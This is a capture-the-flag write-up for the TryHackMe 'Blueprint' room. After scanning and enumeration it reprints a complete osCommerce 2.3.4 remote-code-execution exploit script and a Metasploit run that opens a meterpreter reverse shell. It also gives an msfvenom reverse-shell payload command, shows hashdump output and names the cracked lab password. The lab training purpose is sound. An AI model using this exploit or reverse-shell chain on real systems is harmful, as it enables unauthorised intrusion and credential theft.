# [Blueprint THM Room](https://tryhackme.com/room/blueprint)
## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial [ip]
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-09-21 14:49 BST
Nmap scan report for ip-10-10-71-65.eu-west-1.compute.internal (target-ip)
Host is up (0.093s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:B6:2D:E0:87:45 (Unknown)
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -15s, deviation: 0s, median: -15s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:b6:2d:e0:87:45 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-09-21T14:50:45+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-21 14:50:45
|_  start_date: 2023-09-21 14:17:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.69 seconds
```

### Gobuster
#### Port 80
```
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/21 14:55:09 Starting gobuster
===============================================================
===============================================================
2023/09/21 15:21:30 Finished
===============================================================
```
- There is nothing here, and there is nothing on visible through the web page. 

```
gobuster dir -u http://[ip]:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/21 14:55:09 Starting gobuster
===============================================================
===============================================================
2023/09/21 15:21:30 Finished
===============================================================
```
- Again, nothing of relevance here.

```
gobuster dir -u http://[ip]:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/21 15:50:35 Starting gobuster
===============================================================
/licenses (Status: 403)
/%20 (Status: 403)
/*checkout* (Status: 403)
/phpmyadmin (Status: 403)
/webalizer (Status: 403)
/*docroot* (Status: 403)
/* (Status: 403)
/con (Status: 403)
/http%3A (Status: 403)
/**http%3a (Status: 403)
/*http%3A (Status: 403)
/aux (Status: 403)
/**http%3A (Status: 403)
/%C0 (Status: 403)
/server-status (Status: 200)
/%3FRID%3D2671 (Status: 403)
/devinmoore* (Status: 403)
/200109* (Status: 403)
/*sa_ (Status: 403)
/*dc_ (Status: 403)
/%D8 (Status: 403)
/%CF (Status: 403)
/%CD (Status: 403)
/%CC (Status: 403)
/%CB (Status: 403)
/%CA (Status: 403)
/%D0 (Status: 403)
/%D1 (Status: 403)
/%D7 (Status: 403)
/%D6 (Status: 403)
/%D5 (Status: 403)
/%D4 (Status: 403)
/%D3 (Status: 403)
/%D2 (Status: 403)
/%C9 (Status: 403)
/%C8 (Status: 403)
/%C1 (Status: 403)
/%CE (Status: 403)
/%C2 (Status: 403)
/%C7 (Status: 403)
/%C6 (Status: 403)
/%C5 (Status: 403)
/%C3 (Status: 403)
/%D9 (Status: 403)
/%DF (Status: 403)
/%DD (Status: 403)
/%DE (Status: 403)
/%DB (Status: 403)
/%C4 (Status: 403)
/login%3f (Status: 403)
/%22julie%20roehm%22 (Status: 403)
/%22james%20kim%22 (Status: 403)
/%22britney%20spears%22 (Status: 403)
===============================================================
2023/09/21 15:59:20 Finished
===============================================================
```
- There is a lot of information here. Most return a 403 Forbidden, but it could potentially give us places to look and information to enumerate further.

---
## Enumeration
### HTTP 
- Visiting port 8080 on the target IP address through the web browser shows us the following directory page:

![Port 8080](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/eeed20ce-2cbc-4f94-bac4-124ec2dcbe8a)

- With some manual enumeration, we can see a few interesting things. To start, there is a webpage under this directory called `catalog` that gives us the following:

![Catalog Eshop](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/f8197172-a972-434a-88dd-a57bac99b365)


- Clicking around on a few of the links, we can see a `.php` extension appear in the URL. The links don't go anywhere, and display the following information:
```
http://localhost:8080/oscommerce-2.3.4/catalog/product_info.php?products_id=12
```
- This could lead to something like an IDOR vulnerability, or potentially abusing php in some way. But for now, let's keep looking around. 

- The other directory holds a lot of `.pdf` files that look like configuration information. In a real penetration test, this could probably be more useful. These files reference infrastructure implementations, version numbers, hardware mappings, and other valuable info. 

### SMB
#### SMBMap
```
smbmap -H [ip]
```

```
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: target-ip:445	Name: ip-10-10-71-65.eu-west-1.compute.internal	Status: Authenticated
[!] Something weird happened: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.) on line 967
```
- This is somewhat strange. Let's continue enumerating. 

---
## System Hacking
### Exploit DB
- During our enumeration, we were able to uncover the underlying system that runs the `catalog` page hosted on the web server. It looks like osCommerce was used, so we can start by looking around and researching exploits to see if that can help us. Looking at the screenshot above, we can see that the version of osCommerce being used is 2.3.4. We can find an RCE exploit:

![Exploit-DB osCommerce](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/d6b86936-6b31-41fb-bc74-ff0f7f2cb0fb)


- Here is the code that we will be using to grab a shell on the target:
```python
# Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)
# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# Vendor Homepage: https://www.oscommerce.com/
# Version: osCommerce 2.3.4
# Tested on: Windows

import requests
import sys

if(len(sys.argv) != 2):
	print("please specify the osCommerce url")
	print("format: python3 osCommerce2_3_4RCE.py <url>")
	print("eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog")
	sys.exit(0)

baseUrl = sys.argv[1]
testVulnUrl = baseUrl + '/install/install.php'

def rce(command):
	#targeting the finish step which is step 4
	targetUrl = baseUrl + '/install/install.php?step=4'

	payload = "');"
	payload += "passthru('" + command + "');"    # injecting system command here
	payload += "/*"

	#injecting parameter
	data = {
		'DIR_FS_DOCUMENT_ROOT': './',
		'DB_DATABASE' : payload
	}	

	response = requests.post(targetUrl, data=data)

	if(response.status_code == 200):
		#print('[*] Successfully injected payload to config file')

		readCMDUrl = baseUrl + '/install/includes/configure.php'
		cmd = requests.get(readCMDUrl)

		commandRsl = cmd.text.split('\n')

		if(cmd.status_code == 200):
			#print('[*] System Command Execution Completed')
			#removing the error message above
			for i in range(2, len(commandRsl)):
				print(commandRsl[i])
		else:
			return '[!] Configure.php not found'

				
	else:
		return '[!] Fail to inject payload'



#testing vulnerability accessing the directory
test = requests.get(testVulnUrl)

#checking the install directory still exist or able to access or not
if(test.status_code == 200):
	print('[*] Install directory still available, the host likely vulnerable to the exploit.')
	
	#testing system command injection
	print('[*] Testing injecting system command to test vulnerability')
	cmd = 'whoami'

	print('User: ', end='')
	err = rce(cmd)

	if(err != None):
		print(err)
		sys.exit(0)

	while(True):
		cmd = input('RCE_SHELL$ ')
		err = rce(cmd)

		if(err != None):
			print(err)
			sys.exit(0)

else:
	print('[!] Install directory not found, the host is not vulnerable')
	sys.exit(0)
```

- This is the syntax that we will need to use to run the script properly:
```python
python3 exploit.py http://target-ip:8080/oscommerce-2.3.4/catalog
```

- We now have shell on the system and are currently the `nt authority/system` user. Now this works, but I haven't been able to traverse directories or escalate privileges. After some research and a little help from the walkthrough, I found that Metasploit has a module that can do something similar, but can provide a meterpreter shell, allowing for more functionality, which, in turn, can allow us to do more enumeration and privilege escalation. 

### Metasploit
- After starting the msfconsole, we can use the following syntax to set up and launch the exploit we need:
```ruby
msf6 > search oscommerce

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution
   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/oscommerce_installer_unauth_code_exec

msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting    Required  Description
   ----     ---------------    --------  -----------
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT    80                 yes       The target port (TCP)
   SSL      false              no        Negotiate SSL/TLS for outgoing connec
                                         tions
   URI      /catalog/install/  yes       The path to the install directory
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  attacking-ip    yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RHOSTS target-ip
RHOSTS => target-ip
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting    Required  Description
   ----     ---------------    --------  -----------
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS   target-ip        yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT    8080               yes       The target port (TCP)
   SSL      false              no        Negotiate SSL/TLS for outgoing connec
                                         tions
   URI      /catalog/install/  yes       The path to the install directory
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  attacking-ip    yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1


msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI /oscommerce-2.3.4/catalog/install
URI => /oscommerce-2.3.4/catalog/install
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > exploit

[*] Started reverse TCP handler on attacking-ip:4444 
[*] Sending stage (39927 bytes) to target-ip
[*] Meterpreter session 1 opened (attacking-ip:4444 -> target-ip:49524) at 2023-09-21 16:59:23 +0100

meterpreter > 

```

- We now have a meterpreter session on the target machine. From here, we could use built-in tools like `hashdump` to grab user hashes and attempt to gain system privileges by using the `get system` command, but that isn't necessary because we got onto the machine as `nt authority/system`. 

### User Password
- While we have already gotten a root shell on the target, THM wants us to fully pwn the device by finding the `Lab` user password. 
- If we were to do basic system hacking and then move to privilege escalation, we may start by trying to get a reverse shell on the machine by using Metasploit. We could generate a malicious payload using MSFVenom, and then get that onto the target. Since we are already `nt authority/system`, this should be pretty easy. To generate the MSFVenom payload, we can use the following syntax:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker IP] LPORT=8888 -f exe > shell.exe
```

- Upload the shell with the `upload shell.exe` syntax through the meterpreter shell, but make sure you are in the directory in Metasploit where the MSFVenom payload was generated. 
- Open up another Metasploit session and use the following syntax `use exploit/multi/handler` to be able to catch the reverse connection once `shell.exe` is executed on the target. Set the appropriate options and type `run`. 
- Use `execute -f shell.exe` to run the executable, and you should receive a hit on the second Metasploit instance. The output should look something like the following:

```ruby
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on attacking-ip:7777 
[*] Sending stage (176195 bytes) to target-ip
[*] Meterpreter session 1 opened (attacking-ip:7777 -> target-ip:49167) at 2020-09-23 15:13:54 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
meterpreter > 
```

- From here, we can use something like Crackstation or John The Ripper to crack the password hash for `Lab` user:
	- Password: googleplus

---
## Privilege Escalation
- We don't really need to do privilege escalation, since the meterpreter session allows us to access the `Administrator` folder, considering we got onto the machine as `nt authority/system`. This allows us to look at the `root.txt` file found in the `Administrator\Desktop` folder. 

---
## Rabbit Holes
### SMB
- SMB didn't really turn out to give us any relevant information, and seems to have been left on by default when the machine was created. I did light enumeration and even went through the trouble of installing SMBmap on the THM AttackBox to try and get more information. However, this didn't provide worthwhile results. 

### Directory Brute Forcing
- While it is good practice to be thorough, using Gobuster on the 80 and 443 ports of the web server wasn't worthwhile and didn't give us any information. This is probably just left over from the basic IIS setup on the Windows web services.
- It would've been very easy to go down the rabbit hole of checking each directory that returned a 403 HTTP Status Codes, but that wasn't necessary. However, the name of some of the discovered directories could be distracting (like `php-admin`, for example) and waste time. 
